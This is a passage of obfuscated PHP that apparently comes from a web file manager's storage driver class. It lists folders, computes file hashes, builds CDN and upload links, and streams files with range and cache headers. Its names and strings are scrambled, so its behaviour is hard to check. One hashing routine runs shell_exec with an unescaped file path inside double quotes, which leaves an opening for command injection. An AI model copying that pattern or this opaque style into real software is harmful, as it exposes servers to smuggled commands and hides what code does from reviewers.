copyFile($c”Ëòæ±Ñ¦, $E½Æ˜å´à²) { } public function moveFile($d´÷ñ‹Ø“š, $aêõ˜ß…›Ô) { } public function remove($Aô„Øö„¯™) { if ($this->isFile($Aô„Øö„¯™)) { return $this->delFile($Aô„Øö„¯™); } return $this->delFolder($Aô„Øö„¯™); } public function rename($E –¨¥‚é§, $aî›ñÏÂÃÕ) { } public function exist($D¸Ù—à™˜‡) { } public function findByHash($bÌè«Éæ™Ú = '', $CÍÛË·¬©ï = '') { return !1; } public function isFile($aˆ¢Ë±”¿) { } public function isFolder($b±ŠË£Š¥Ü) { } public function size($d¯Ô—‰äªô) { } public function info($C»‰¶ªõóÅ) { } public function infoSimple($dÅÊù”ØÖÌ) { return $this->info($dÅÊù”ØÖÌ); } public function infoAuth($Cä‹ÍäË¯—) { return $this->info($Cä‹ÍäË¯—); } public function infoFull($FÑ·Òø½Á) { return $this->info($FÑ·Òø½Á); } public function infoWithChildren($Eáá’ššô) { $A¼Û“íÔ¸ =& $_SERVER[Â€Á›¨õ]; static $C‘ÄÌçÆŠÎ = array(); if (isset($C‘ÄÌçÆŠÎ[$Eáá’ššô])) { return $C‘ÄÌçÆŠÎ[$Eáá’ššô]; } $A×Šî§îÊ¦ = $this->info($Eáá’ššô); if ($A×Šî§îÊ¦ && $A×Šî§îÊ¦[$A¼Û“íÔ¸[29]] == $A¼Û“íÔ¸[76]) { $b¹îØíìÔ¶ = array($A¼Û“íÔ¸[77] => 0, $A¼Û“íÔ¸[78] => 0, $A¼Û“íÔ¸[79] => 0); $this->infoChildren($Eáá’ššô, $b¹îØíìÔ¶); $A×Šî§îÊ¦[$A¼Û“íÔ¸[77]] = $b¹îØíìÔ¶[$A¼Û“íÔ¸[77]]; $A×Šî§îÊ¦[$A¼Û“íÔ¸[80]] = array($A¼Û“íÔ¸[81] => $b¹îØíìÔ¶[$A¼Û“íÔ¸[78]], $A¼Û“íÔ¸[82] => $b¹îØíìÔ¶[$A¼Û“íÔ¸[79]]); $C‘ÄÌçÆŠÎ[$Eáá’ššô] = $A×Šî§îÊ¦; } return $A×Šî§îÊ¦; } public function listPath($F‚ƒ»ÂµÖñ, $b‰®ãÍÒæ = false) { } public function has($b„ÒŠÍ©…‚, $Eå†Ä¹å‰´ = false, $d’ÚëíÜÊ = false) { } public function canRead($fÇƒŠîÉÄ) { } public function canWrite($A¿ØÕ¬æğ) { } public function getContent($eå°¡ Ô) { } public function setContent($DÓ¼ğ‘Œ¤Œ, $FÎ¥ÂèÓ¤Å = '') { } protected function infoChildren($EîÌ´‰³ÚÁ, &$dƒÓ”Ğî×) { $BŒ»–˜ÔÆñ =& $_SERVER[Â€Á›¨õ]; check_abort_echo(); $cİÒËîø‹Ô = $this->listPath($EîÌ´‰³ÚÁ, !0); $cİÒËîø‹Ô = array_merge($cİÒËîø‹Ô[$BŒ»–˜ÔÆñ[74]], $cİÒËîø‹Ô[$BŒ»–˜ÔÆñ[73]]); foreach ($cİÒËîø‹Ô as $f¥¬Ìò¢Ó†) { if ($f¥¬Ìò¢Ó†[$BŒ»–˜ÔÆñ[29]] == $BŒ»–˜ÔÆñ[76]) { $dƒÓ”Ğî×[$BŒ»–˜ÔÆñ[79]]++; $a©£ì‹«ÓÛ = $this->getPathInner($f¥¬Ìò¢Ó†[$BŒ»–˜ÔÆñ[75]]); $this->infoChildren($a©£ì‹«ÓÛ, $dƒÓ”Ğî×); } else { $dƒÓ”Ğî×[$BŒ»–˜ÔÆñ[78]]++; $dƒÓ”Ğî×[$BŒ»–˜ÔÆñ[77]] += $f¥¬Ìò¢Ó†[$BŒ»–˜ÔÆñ[77]]; } } } public function fileSubstr($eÉ°ÃØ‹‹Á, $dÂÕæ‘œ¶Ê, $AÔŒ‹©ù«) { } public function listAll($b›Ó·¬Ñ¿Š) { } public function listAllMake($eá“ÉÓ‰î÷, &$Aœß›) { $eŠ»Ü°ôŞ‘ =& $_SERVER[Â€Á›¨õ]; check_abort_echo(); $dÛÏ–ñ¨Ç‘ = $this->listPath($eá“ÉÓ‰î÷, !0); if (!$dÛÏ–ñ¨Ç‘) { return; } $D¤§Ù‹åÈ = array_merge($dÛÏ–ñ¨Ç‘[$eŠ»Ü°ôŞ‘[74]], $dÛÏ–ñ¨Ç‘[$eŠ»Ü°ôŞ‘[73]]); foreach ($D¤§Ù‹åÈ as $A‹¡£½è×) { goto CŸ›Œù‰£š; C ¹Öàà: $this->listAllMake($A‹¡£½è×[$eŠ»Ü°ôŞ‘[75]], $Aœß›); goto FàßçÌ¶”Ò; C³ñ²æŸ™¢: if (isset($A‹¡£½è×[$eŠ»Ü°ôŞ‘[83]])) { $d¬öÎô…ğ‘[$eŠ»Ü°ôŞ‘[83]] = $A‹¡£½è×[$eŠ»Ü°ôŞ‘[83]]; } if (!$AÄİÕßÖÆ ) { $Aœß›[] = $d¬öÎô…ğ‘; continue; } $Aœß›[] = $d¬öÎô…ğ‘; goto C ¹Öàà; CŸ›Œù‰£š: $AÄİÕßÖÆ  = $A‹¡£½è×[$eŠ»Ü°ôŞ‘[29]] == $eŠ»Ü°ôŞ‘[76]; $d¬öÎô…ğ‘ = array($eŠ»Ü°ôŞ‘[75] => $A‹¡£½è×[$eŠ»Ü°ôŞ‘[75]], $eŠ»Ü°ôŞ‘[76] => $AÄİÕßÖÆ ); if (isset($A‹¡£½è×[$eŠ»Ü°ôŞ‘[77]])) { $d¬öÎô…ğ‘[$eŠ»Ü°ôŞ‘[77]] = $A‹¡£½è×[$eŠ»Ü°ôŞ‘[77]]; } goto C³ñ²æŸ™¢; FàßçÌ¶”Ò: } } public function listAllSimple($EãïÛµÙ£ç) { $bÄµã‰àÎÓ =& $_SERVER[Â€Á›¨õ]; $bÈèäãË = array(); $añé»È“õÑ = $this->listAll($EãïÛµÙ£ç); $b…É†Ñ­‘ä = $this->getPathOuter($EãïÛµÙ£ç); foreach ($añé»È“õÑ as $AÒÈÉ¦³Í¦) { goto CÒÖŒ»Îš¼; aÓš˜˜¡ºì: if (!$AÒÈÉ¦³Í¦[$bÄµã‰àÎÓ[76]]) { $Bà÷áİáœ’[$bÄµã‰àÎÓ[85]] = $D‰¦Ûâ¡§ù; } $bÈèäãË[] = $Bà÷áİáœ’; goto E“‚Ò÷µ–; CÒÖŒ»Îš¼: $D‰¦Ûâ¡§ù = $AÒÈÉ¦³Í¦[$bÄµã‰àÎÓ[75]]; $f½‹Ù¸ºˆñ = $AÒÈÉ¦³Í¦[$bÄµã‰àÎÓ[75]]; if (isset($AÒÈÉ¦³Í¦[$bÄµã‰àÎÓ[84]])) { $D‰¦Ûâ¡§ù = $AÒÈÉ¦³Í¦[$bÄµã‰àÎÓ[84]][$bÄµã‰àÎÓ[75]]; $AÒÈÉ¦³Í¦[$bÄµã‰àÎÓ[77]] = $AÒÈÉ¦³Í¦[$bÄµã‰àÎÓ[84]][$bÄµã‰àÎÓ[77]]; $AÒÈÉ¦³Í¦[$bÄµã‰àÎÓ[83]] = $AÒÈÉ¦³Í¦[$bÄµã‰àÎÓ[84]][$bÄµã‰àÎÓ[83]]; } else { $f½‹Ù¸ºˆñ = substr($AÒÈÉ¦³Í¦[$bÄµã‰àÎÓ[75]], strlen(get_path_father($b…É†Ñ­‘ä))); $f½‹Ù¸ºˆñ = $bÄµã‰àÎÓ[8] . ltrim($f½‹Ù¸ºˆñ, $bÄµã‰àÎÓ[8]); } goto cÕ‰Äğì»ê; cÕ‰Äğì»ê: $Bà÷áİáœ’ = array($bÄµã‰àÎÓ[75] => $f½‹Ù¸ºˆñ, $bÄµã‰àÎÓ[76] => $AÒÈÉ¦³Í¦[$bÄµã‰àÎÓ[76]]); if (isset($AÒÈÉ¦³Í¦[$bÄµã‰àÎÓ[77]]) && !$AÒÈÉ¦³Í¦[$bÄµã‰àÎÓ[76]]) { $Bà÷áİáœ’[$bÄµã‰àÎÓ[77]] = $AÒÈÉ¦³Í¦[$bÄµã‰àÎÓ[77]]; } if (isset($AÒÈÉ¦³Í¦[$bÄµã‰àÎÓ[83]])) { $Bà÷áİáœ’[$bÄµã‰àÎÓ[83]] = $AÒÈÉ¦³Í¦[$bÄµã‰àÎÓ[83]]; } goto aÓš˜˜¡ºì; E“‚Ò÷µ–: } return $bÈèäãË; } public function upload($e—ªùëÊ¯, $a×âÇææ‹Œ, $C§ñæÓÙ›Ç = false, $dÑ–¶Ç·ùº = REPEAT_REPLACE) { } public function uploadFileByID($fä’Ğ“Ğ¼, $c÷ÒŠÂä , $e˜ ÓÃâ¼ß) { } public function uploadFileByPath($eèè”›ñË‡, $C©ÜÑ¹²ˆ, $E’Ã£—âï´ = array()) { } public function isUploadServer() { $Aö÷”×Ôˆ© =& $_SERVER[Â€Á›¨õ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Aö÷”×Ôˆ©[86]) { return !0; } return $GLOBALS[$Aö÷”×Ôˆ©[6]][$Aö÷”×Ôˆ©[87]][$Aö÷”×Ôˆ©[88]]; } public function isFileOutServer() { $Eİ³ªãºÁ =& $_SERVER[Â€Á›¨õ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Eİ³ªãºÁ[86]) { return !0; } return $GLOBALS[$Eİ³ªãºÁ[6]][$Eİ³ªãºÁ[87]][$Eİ³ªãºÁ[89]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($aîÖœÜ‰¢×) { $a³šğêÂà =& $_SERVER[Â€Á›¨õ]; if (!$this->isCdnHost()) { return $aîÖœÜ‰¢×; } return str_replace(trim(get_url_root($aîÖœÜ‰¢×), $a³šğêÂà[8]), trim($this->cdnHost, $a³šğêÂà[8]), $aîÖœÜ‰¢×); } public function uploadLink($fˆ«ôĞ¤éƒ, $CêÈô¾ë± = 0) { goto C©Ê«ãç÷é; e’”Ùæªˆ: if ($eÛÙĞßš¾×) { $eÛÙĞßš¾×[$dØ…¯òê³›[92]] = $fˆ«ôĞ¤éƒ; $eÛÙĞßš¾×[$dØ…¯òê³›[93]] = $fßÈÜåì‚; } return $eÛÙĞßš¾×; goto fí¥‚„éñ; fãÍ”öÛ½: if (!in_array($fßÈÜåì‚, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $a°¬Ô‚Üµø = 1024 * 1024 * 10; goto dÃ÷¥˜ã¥ª; C©Ê«ãç÷é: $dØ…¯òê³› =& $_SERVER[Â€Á›¨õ]; if ($this->isUploadServer()) { return; } $fßÈÜåì‚ = $this->getType(); goto fãÍ”öÛ½; dÃ÷¥˜ã¥ª: $eŸº³âöŸó = $CêÈô¾ë± <= $a°¬Ô‚Üµø ? $dØ…¯òê³›[90] : $dØ…¯òê³›[91]; $c«ÕÁ»ö‰« = (!$CêÈô¾ë± ? 1 : ceil($CêÈô¾ë± / pow(1024, 3))) * 3600 * 4; $eÛÙĞßš¾× = $this->{$eŸº³âöŸó}($fˆ«ôĞ¤éƒ, $c«ÕÁ»ö‰«); goto e’”Ùæªˆ; fí¥‚„éñ: } public function uploadFormData($E˜ˆÃ½Õ‘È, $A³»îõÜ = 3600) { } public function multiUploadFormData($BÊéò­­÷˜, $b ó¹ÕğøŸ = 3600) { } public function download($a˜òÑ¿ºáÂ, $Fëá¯Â½š¡) { } public function ext($DËè““ƒ«Ø) { $bÁãÃÑ± =& $_SERVER[Â€Á›¨õ]; if (strpos($DËè““ƒ«Ø, $bÁãÃÑ±[8]) === -1) { $BàŞé›¦·í = $DËè““ƒ«Ø; } else { $BàŞé›¦·í = $this->pathThis($DËè““ƒ«Ø); } $A•¾ø°õ¡– = $bÁãÃÑ±[33]; if (strstr($BàŞé›¦·í, $bÁãÃÑ±[94])) { $A•¾ø°õ¡– = substr($BàŞé›¦·í, strrpos($BàŞé›¦·í, $bÁãÃÑ±[94]) + 1); $A•¾ø°õ¡– = strtolower($A•¾ø°õ¡–); } if (strlen($A•¾ø°õ¡–) > 3 && preg_match($bÁãÃÑ±[95], $A•¾ø°õ¡–, $Fö³Š°¼ò¨)) { $A•¾ø°õ¡– = $bÁãÃÑ±[33]; } return $A•¾ø°õ¡–; } public function pathThis($Aº‘ã›à¸‘) { $bÙ‰†õí© =& $_SERVER[Â€Á›¨õ]; $Aº‘ã›à¸‘ = str_replace($bÙ‰†õí©[96], $bÙ‰†õí©[8], rtrim($Aº‘ã›à¸‘, $bÙ‰†õí©[8])); $d­Â²¨…¼œ = strrpos($Aº‘ã›à¸‘, $bÙ‰†õí©[8]); if ($d­Â²¨…¼œ === !1) { return $Aº‘ã›à¸‘; } return substr($Aº‘ã›à¸‘, $d­Â²¨…¼œ + 1); } public function pathFather($Cï­óî«…à) { $E£ñ†Â®×” =& $_SERVER[Â€Á›¨õ]; $Cï­óî«…à = str_replace($E£ñ†Â®×”[96], $E£ñ†Â®×”[8], rtrim($Cï­óî«…à, $E£ñ†Â®×”[8])); $a©š‚Ä–ßÓ = strrpos($Cï­óî«…à, $E£ñ†Â®×”[8]); if ($a©š‚Ä–ßÓ === !1) { return $E£ñ†Â®×”[33]; } return substr($Cï­óî«…à, 0, $a©š‚Ä–ßÓ + 1); } public function hashSimple($fñ»Œ˜ùÅ) { goto DÉÈ»êº¡; DÉÈ»êº¡: $DËÅ –® =& $_SERVER[Â€Á›¨õ]; if (!$fñ»Œ˜ùÅ) { return md5($DËÅ –®[33]); } $f‰öÜ˜­¹À = $this->size($fñ»Œ˜ùÅ); goto aÆ“Ö¸êŸ; aÆ“Ö¸êŸ: $cÃÛ§Òéíó = 200; $EÖÎÖÅ¼Ø = 50; if ($f‰öÜ˜­¹À <= $cÃÛ§Òéíó * $EÖÎÖÅ¼Ø) { return $this->hashMd5($fñ»Œ˜ùÅ) . $f‰öÜ˜­¹À; } goto FºÍ¦‰Ì´ñ; FºÍ¦‰Ì´ñ: $dÚ¡ß£°‡ = intval($f‰öÜ˜­¹À / $EÖÎÖÅ¼Ø); $eŸ÷ ÃÙ÷… = $DËÅ –®[33]; for ($bš›¸§‘ÙŒ = 0; $bš›¸§‘ÙŒ < $EÖÎÖÅ¼Ø; $bš›¸§‘ÙŒ++) { $eŸ÷ ÃÙ÷… .= $this->fileSubstr($fñ»Œ˜ùÅ, $dÚ¡ß£°‡ * $bš›¸§‘ÙŒ, $cÃÛ§Òéíó); } goto CˆÀÒè‚åò; CˆÀÒè‚åò: $eŸ÷ ÃÙ÷… .= $this->fileSubstr($fñ»Œ˜ùÅ, $f‰öÜ˜­¹À - $cÃÛ§Òéíó, $cÃÛ§Òéíó); return md5($eŸ÷ ÃÙ÷…) . $f‰öÜ˜­¹À; goto eøÍ¸¬É³Ù; eøÍ¸¬É³Ù: } public static $md5Cache = array(); public function hashMd5($B”³–ƒæÏä) { $B”³–ƒæÏä = $this->iconvSystem($B”³–ƒæÏä); if (isset(self::$md5Cache[$B”³–ƒæÏä])) { return self::$md5Cache[$B”³–ƒæÏä]; } self::$md5Cache[$B”³–ƒæÏä] = $this->hashMd5Shell($B”³–ƒæÏä); if (!self::$md5Cache[$B”³–ƒæÏä]) { self::$md5Cache[$B”³–ƒæÏä] = @md5_file($B”³–ƒæÏä); } return self::$md5Cache[$B”³–ƒæÏä]; } private function hashMd5Shell($FˆÏ‰¡Œ’) { goto eïã¥­ÜÌÑ; cõÄ†çğó©: $b™êŸÇÔá = shell_exec($f¦‰ô¶™Ò . "\x20\42{$FˆÏ‰¡Œ’}\x22"); $b™êŸÇÔá = str_replace($cƒªÔ¼‘¿ç[103], $cƒªÔ¼‘¿ç[33], $b™êŸÇÔá); return substr($b™êŸÇÔá, 0, 32); goto dÎ¶ÚÖè«¢; D‹ÂÉ·Áğ¡: $f¦‰ô¶™Ò = Cache::get($cƒªÔ¼‘¿ç[100]); if (!$f¦‰ô¶™Ò) { $E–çˆ­„¾ = BASIC_PATH . $cƒªÔ¼‘¿ç[101]; $AÓ¸ø¬‡’ = md5_file($E–çˆ­„¾); $f¦‰ô¶™Ò = $cƒªÔ¼‘¿ç[102]; foreach ($EôŠÌ¥öóÃ as $FÃ‰È³ ø) { $b™êŸÇÔá = shell_exec($FÃ‰È³ ø . "\x20\x22{$E–çˆ­„¾}\42"); if ($b™êŸÇÔá && substr(trim($b™êŸÇÔá), 0, 32) == $AÓ¸ø¬‡’) { $f¦‰ô¶™Ò = $FÃ‰È³ ø; break; } } Cache::set($cƒªÔ¼‘¿ç[100], $f¦‰ô¶™Ò, 3600); } if ($f¦‰ô¶™Ò == $cƒªÔ¼‘¿ç[102]) { return !1; } goto cõÄ†çğó©; eïã¥­ÜÌÑ: $cƒªÔ¼‘¿ç =& $_SERVER[Â€Á›¨õ]; if (!function_exists($cƒªÔ¼‘¿ç[97])) { return !1; } $EôŠÌ¥öóÃ = array($cƒªÔ¼‘¿ç[98], $cƒªÔ¼‘¿ç[99]); goto D‹ÂÉ·Áğ¡; dÎ¶ÚÖè«¢: } public function link($f·®òò‚ÍÅ) { return $f·®òò‚ÍÅ; } public function fileOut($DŒæÁ£¨¯Í, $cÊ©Ã…›Éù = false, $AÏÑ×—¾‹Š = false, $Cí‘®Ó´Ó‹ = '') { goto E×°¨³áˆË; c‡§–‹‘¦›: $Aß”ÕÉº³ˆ = get_file_mime($C´Úº²ˆÆ¥); if (strstr($Aß”ÕÉº³ˆ, $CÙ±Ù¾[116])) { $Aß”ÕÉº³ˆ = $Aß”ÕÉº³ˆ . $CÙ±Ù¾[117]; } if ($cÊ©Ã…›Éù === !1 && !mime_support($Aß”ÕÉº³ˆ)) { $cÊ©Ã…›Éù = !0; $Aß”ÕÉº³ˆ = $CÙ±Ù¾[118]; } goto C÷¿•…¨ÒÒ; eîŒˆ²é³×: if ($_SERVER[$CÙ±Ù¾[156]] == $CÙ±Ù¾[157]) { return; } $f¯ç–•À‘Ã = 1024 * 100; $DßŸŠßİá = 0; goto a´§¿Ïó´£; Bº’›òÙñŞ: header($CÙ±Ù¾[127]); header($CÙ±Ù¾[128]); header($CÙ±Ù¾[129]); goto C‹ÔĞæè¤; cÎº¶­ÑŠ: header($CÙ±Ù¾[134] . $aø‰òÛ¾ù™ . $CÙ±Ù¾[126]); header($CÙ±Ù¾[135] . $Aè«ÊÛºË¹); header($CÙ±Ù¾[136]); goto d±¸Û¾Ÿ°š; d±¸Û¾Ÿ°š: header($CÙ±Ù¾[137] . $fÈãÁš¢Èî); header($CÙ±Ù¾[138]); if (!$cÊ©Ã…›Éù && $C´Úº²ˆÆ¥ == $CÙ±Ù¾[139]) { if ($fÈãÁš¢Èî > 1024 * 1024 * 5) { die; } $a©°å‘È™Ï = $this->getContent($DŒæÁ£¨¯Í); $a©°å‘È™Ï = Html::clearSVG($a©°å‘È™Ï); header($CÙ±Ù¾[140] . strlen($a©°å‘È™Ï)); echo $a©°å‘È™Ï; die; } goto d•¤œç§; d•¤œç§: $aÙá¶Ù©Ã¨ = strtolower($_SERVER[$CÙ±Ù¾[141]]); if ($B¡Øè””‘ && $aÙá¶Ù©Ã¨ && $eÜÔëÍÏë˜) { if (strstr($aÙá¶Ù©Ã¨, $CÙ±Ù¾[142])) { header($CÙ±Ù¾[143] . $DŒæÁ£¨¯Í); } else { if (strstr($aÙá¶Ù©Ã¨, $CÙ±Ù¾[144])) { header($CÙ±Ù¾[145] . $DŒæÁ£¨¯Í); } else { if (strstr($aÙá¶Ù©Ã¨, $CÙ±Ù¾[146])) { header($CÙ±Ù¾[147] . $DŒæÁ£¨¯Í); } } } if ($eÓ†ö£¼ˆ•) { header($CÙ±Ù¾[148] . $eÓ†ö£¼ˆ•); } return; } if (isset($_SERVER[$CÙ±Ù¾[149]])) { if (preg_match($CÙ±Ù¾[150], $_SERVER[$CÙ±Ù¾[149]], $FÍÕÇĞ×´)) { $a†›‘ÕÍ…â = intval($FÍÕÇĞ×´[1]); if (!empty($FÍÕÇĞ×´[2])) { $fÔ¦æÙ³Ü¡ = intval($FÍÕÇĞ×´[2]); } } header($CÙ±Ù¾[151]); header("\103\157\x6e\164\145\156\164\x2d\x52\x61\156\x67\x65\x3a\40\x62\x79\x74\x65\x73\x20{$a†›‘ÕÍ…â}\x2d{$fÔ¦æÙ³Ü¡}\x2f" . $fÈãÁš¢Èî); } else { header($CÙ±Ù¾[152]); } goto eÖ‘íœŒš; C÷¿•…¨ÒÒ: header($CÙ±Ù¾[119]); header($CÙ±Ù¾[120] . $Aß”ÕÉº³ˆ); $D±ì Ú§ = rawurlencode($Aè«ÊÛºË¹); goto B¯¬ØÄÌÉ™; a´§¿Ïó´£: if ($eÓ†ö£¼ˆ•) { $DßŸŠßİá = intval(1000 * 1000 * ($f¯ç–•À‘Ã / $eÓ†ö£¼ˆ•)); } while ($a†›‘ÕÍ…â <= $fÔ¦æÙ³Ü¡) { $aëÔø©‹ÕÙ = timeFloat(); check_abort(); $aº£ƒ°Ê‡— = $fÔ¦æÙ³Ü¡ - $a†›‘ÕÍ…â + 1; if ($aº£ƒ°Ê‡— <= $f¯ç–•À‘Ã) { $f¯ç–•À‘Ã = $aº£ƒ°Ê‡—; } echo $this->fileSubstr($DŒæÁ£¨¯Í, $a†›‘ÕÍ…â, $f¯ç–•À‘Ã); $a†›‘ÕÍ…â += $f¯ç–•À‘Ã; if ($f¯ç–•À‘Ã == $aº£ƒ°Ê‡—) { $a†›‘ÕÍ…â = $fÔ¦æÙ³Ü¡ + 1; } if ($DßŸŠßİá) { $C—®¸µÔß” = intval(1000 * 1000 * (timeFloat() - $aëÔø©‹ÕÙ)); $d‚±Ï¤š·¦ = $DßŸŠßİá - $C—®¸µÔß”; if ($d‚±Ï¤š·¦ > 5) { usleep($d‚±Ï¤š·¦); } } } goto f›‘ÛŠƒ¨®; C‹ÔĞæè¤: if (isset($_SERVER[$CÙ±Ù¾[130]]) && strtotime($_SERVER[$CÙ±Ù¾[130]]) == $CÖ½ÓÚ‡ÅÚ[$CÙ±Ù¾[83]]) { header($CÙ±Ù¾[131], !0, 304); die; } if (isset($_SERVER[$CÙ±Ù¾[132]]) && $_SERVER[$CÙ±Ù¾[132]] == $Cí‘®Ó´Ó‹) { header($CÙ±Ù¾[133] . $Cí‘®Ó´Ó‹, !0, 304); die; } header($CÙ±Ù¾[133] . $Cí‘®Ó´Ó‹); goto cÎº¶­ÑŠ; F˜‡ƒ˜Åº®: if (in_array($C´Úº²ˆÆ¥, array($CÙ±Ù¾[110], $CÙ±Ù¾[111], $CÙ±Ù¾[112], $CÙ±Ù¾[113]))) { $C´Úº²ˆÆ¥ = $CÙ±Ù¾[114]; } if (!$Cí‘®Ó´Ó‹) { $Cí‘®Ó´Ó‹ = md5($aø‰òÛ¾ù™ . $this->hashSimple($DŒæÁ£¨¯Í)); } $Cí‘®Ó´Ó‹ = $CÙ±Ù¾[115] . $Cí‘®Ó´Ó‹ . $CÙ±Ù¾[115]; goto c‡§–‹‘¦›; Fà˜ÈÁÆ–: $a†›‘ÕÍ…â = 0; $fÔ¦æÙ³Ü¡ = $fÈãÁš¢Èî - 1; $C´Úº²ˆÆ¥ = $this->ext($Aè«ÊÛºË¹); goto F˜‡ƒ˜Åº®; B¯¬ØÄÌÉ™: $D±ì Ú§ = $CÙ±Ù¾[115] . $D±ì Ú§ . $CÙ±Ù¾[121] . $D±ì Ú§; if ($cÊ©Ã…›Éù) { header($CÙ±Ù¾[122]); header($CÙ±Ù¾[123] . $D±ì Ú§); } else { header($CÙ±Ù¾[124] . $D±ì Ú§); } header($CÙ±Ù¾[125] . gmdate($CÙ±Ù¾[109], time() + 3600 * 24 * 30) . $CÙ±Ù¾[126]); goto Bº’›òÙñŞ; b‰·Í…õ‹: @ob_end_clean(); set_timeout(); $CÖ½ÓÚ‡ÅÚ = $this->infoFull($DŒæÁ£¨¯Í); goto d‰ĞòØóâ; e„µ•²à…: $B¡Øè””‘ = $this->getType() == $CÙ±Ù¾[105]; $eÜÔëÍÏë˜ = $GLOBALS[$CÙ±Ù¾[6]][$CÙ±Ù¾[87]][$CÙ±Ù¾[106]][$CÙ±Ù¾[107]]; $eÓ†ö£¼ˆ• = (double) $GLOBALS[$CÙ±Ù¾[6]][$CÙ±Ù¾[87]][$CÙ±Ù¾[106]][$CÙ±Ù¾[108]] * 1024 * 1024; goto b‰·Í…õ‹; E×°¨³áˆË: $CÙ±Ù¾ =& $_SERVER[Â€Á›¨õ]; $this->cacheMethod(null, null); if (!$DŒæÁ£¨¯Í || !$this->exist($DŒæÁ£¨¯Í)) { show_json(LNG($CÙ±Ù¾[104]), !1, $AÏÑ×—¾‹Š); } goto e„µ•²à…; eÖ‘íœŒš: $bÂçÔÀ³äˆ = !0; if ($_SERVER[$CÙ±Ù¾[153]] == $CÙ±Ù¾[154] && $fÈãÁš¢Èî > 1204 * 1024 * 1024 * 2) { $bÂçÔÀ³äˆ = !1; } if ($bÂçÔÀ³äˆ) { header($CÙ±Ù¾[155] . ($fÔ¦æÙ³Ü¡ - $a†›‘ÕÍ…â + 1)); } goto eîŒˆ²é³×; d‰ĞòØóâ: $fÈãÁš¢Èî = $CÖ½ÓÚ‡ÅÚ[$CÙ±Ù¾[77]]; $aø‰òÛ¾ù™ = gmdate($CÙ±Ù¾[109], $CÖ½ÓÚ‡ÅÚ[$CÙ±Ù¾[83]]); $Aè«ÊÛºË¹ = $AÏÑ×—¾‹Š ? $AÏÑ×—¾‹Š : $this->iconvApp($CÖ½ÓÚ‡ÅÚ[$CÙ±Ù¾[28]]); goto Fà˜ÈÁÆ–; f›‘ÛŠƒ¨®: } public function fileOutServer($E´çÚÄâ³, $Bê¹Õèœ = false, $D¾ ÂÅ¨èŠ = false, $FÇî†¤†×ª = '') { $this->fileOut($E´çÚÄâ³, $Bê¹Õèœ, $D¾ ÂÅ¨èŠ, $FÇî†¤†×ª); } public function fileOutLink($A²²¯¯óĞ·) { header($_SERVER[Â€Á›¨õ][158] . $A²²¯¯óĞ·); die; } public function cacheMethod($f«¶…«ê’, $dò¡ĞšôŞÆ, $F†Áó™–Ø = null) { goto bƒõÅ°ß’´; C¹¼«ƒª¾š: if (!is_null($F†Áó™–Ø)) { $e•éŞóƒé[$b©¢ŒªñÓ÷] = $F†Áó™–Ø; return; } $c¨ŸİÚÌğ = isset($e•éŞóƒé[$b©¢ŒªñÓ÷]) ? $e•éŞóƒé[$b©¢ŒªñÓ÷] : null; if (!is_null($c¨ŸİÚÌğ)) { return $c¨ŸİÚÌğ; } goto FÖÏøñ”‹; FÖÏøñ”‹: $c¨ŸİÚÌğ = $this->{$f«¶…«ê’}($dò¡ĞšôŞÆ); $e•éŞóƒé[$b©¢ŒªñÓ÷] = $c¨ŸİÚÌğ; return $c¨ŸİÚÌğ; goto aŞ³¡¥÷‹õ; F‚ÇŞøŸ—: $b©¢ŒªñÓ÷ = $AÕ¢è–«¤[159] . $f«¶…«ê’ . $AÕ¢è–«¤[160] . rtrim($F³‘Õ­£’Ò, $AÕ¢è–«¤[8]); if (is_null($f«¶…«ê’)) { $e•éŞóƒé = array(); return; } if (is_null($dò¡ĞšôŞÆ)) { unset($e•éŞóƒé[$b©¢ŒªñÓ÷]); return; } goto C¹¼«ƒª¾š; bƒõÅ°ß’´: $AÕ¢è–«¤ =& $_SERVER[Â€Á›¨õ]; static $e•éŞóƒé = array(); $F³‘Õ­£’Ò = $dò¡ĞšôŞÆ ? ltrim($this->getPathOuter($dò¡ĞšôŞÆ), $AÕ¢è–«¤[8]) : $dò¡ĞšôŞÆ; goto F‚ÇŞøŸ—; aŞ³¡¥÷‹õ: } public function fileOutImage($D‹Ğ÷àï¬, $c£ºê‚‚›× = 250) { goto B†… ÛŒ¦‘; DòÊ’÷µéÎ: if ($f¼ßÓŒÁ³[$D†°Š×¿ºï[77]] <= 1024 * 50 || $e™¼”¤Ñ”ø || !function_exists($D†°Š×¿ºï[166]) || $f¼ßÓŒÁ³[$D†°Š×¿ºï[167]] == $D†°Š×¿ºï[168]) { return $this->fileOut($D‹Ğ÷àï¬, !1, $F“ë¼ñì); } if (isset($f¼ßÓŒÁ³[$D†°Š×¿ºï[163]][$D†°Š×¿ºï[169]])) { $Aî–¶¯×Û = $f¼ßÓŒÁ³[$D†°Š×¿ºï[163]][$D†°Š×¿ºï[169]]; } else { if (isset($f¼ßÓŒÁ³[$D†°Š×¿ºï[163]][$D†°Š×¿ºï[170]])) { $Aî–¶¯×Û = $f¼ßÓŒÁ³[$D†°Š×¿ºï[163]][$D†°Š×¿ºï[170]]; } else { $Aî–¶¯×Û = md5("{$f¼ßÓŒÁ³[$D†°Š×¿ºï[28]]}\137{$f¼ßÓŒÁ³[$D†°Š×¿ºï[75]]}\x5f{$f¼ßÓŒÁ³[$D†°Š×¿ºï[77]]}"); } } $CŸ·šŸˆ¡Ñ = "{$Aî–¶¯×Û}\x5f{$c£ºê‚‚›×}\x2e\160\x6e\147"; goto Eâ£˜¯Ï™; FÅ¯’²À’: IO::fileOut($EÀ†‘Šˆ ¥); goto FÄøÄšƒÌ‘; f½¤„×½ù: $F“ë¼ñì = $f¼ßÓŒÁ³[$D†°Š×¿ºï[28]]; $e™¼”¤Ñ”ø = !1; if (isset($GLOBALS[$D†°Š×¿ºï[161]]) && $GLOBALS[$D†°Š×¿ºï[161]][$D†°Š×¿ºï[75]] == $f¼ßÓŒÁ³[$D†°Š×¿ºï[75]]) { $AğŠ°ÃœáÑ = $GLOBALS[$D†°Š×¿ºï[161]][$D†°Š×¿ºï[162]]; if (!$f¼ßÓŒÁ³[$D†°Š×¿ºï[163]]) { $f¼ßÓŒÁ³[$D†°Š×¿ºï[163]] = $GLOBALS[$D†°Š×¿ºï[161]]; } if (isset($AğŠ°ÃœáÑ[$D†°Š×¿ºï[164]])) { if ($AğŠ°ÃœáÑ[$D†°Š×¿ºï[164]] <= $c£ºê‚‚›× && 